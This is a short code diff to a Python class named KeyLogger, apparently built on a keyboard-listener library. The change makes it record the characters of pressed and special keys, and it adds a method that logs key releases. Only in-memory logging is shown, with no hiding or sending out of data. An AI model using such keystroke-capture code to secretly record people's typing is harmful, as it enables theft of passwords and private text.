@@ -34,11 +34,11 @@ class KeyLogger(object):
         try:
             self.nice_output.append('alphanumeric key {0} pressed'.format(
                 key.char))
-            self.simple_output.append()
+            self.simple_output.append('{0}'.format(key.char))
         except AttributeError:
             self.nice_output.append('special key {0} pressed'.format(
                 key))
-
+            self.simple_output.append('{0}'.format(key))
 
     @staticmethod
     def on_release(key):
@@ -47,6 +47,10 @@ class KeyLogger(object):
         if key == keyboard.Key.esc:
             # Stop listener
             return False
+
+    def on_release_silent(self, key):
+        self.nice_output.append('{0} released'.format(
+            key))
 
     @staticmethod
     def monitor_keys():
